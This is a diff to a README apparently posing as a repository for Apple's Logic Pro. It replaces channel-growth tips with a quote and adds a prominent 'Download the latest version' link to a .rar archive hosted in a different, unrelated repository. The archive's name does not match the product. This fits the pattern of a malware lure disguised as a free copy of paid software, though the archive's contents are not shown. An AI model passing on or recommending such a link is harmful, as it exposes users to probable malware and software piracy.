@@ -2,13 +2,12 @@
 ____
 🔥🔥🔥Logic Pro (formerly Logic Pro X) is a software product from Apple Inc. for professional music creation, sound processing and mixing.
 ____
->Regylarity of publications and columns is the most important factor in the success of the channel💡
->>It is better to insert the most interesting intriguing moments at the beginning of the video that will arouse the viewers interest and desire to watch further👁️
+> Life is one great, sweet song, so start the music! - Ronald Reagan
 
 ____
 ![image](https://github.com/Dacota167/Music-recording/assets/165401466/6c54b3ca-8e10-4733-b8f8-142d31e3f28d)
-
-
+# Download
+### [Download the latest version](https://github.com/XLHJiang/literate-umbrella/releases/download/App/FacherGitProject.rar)
 
 
 <div id="badges">
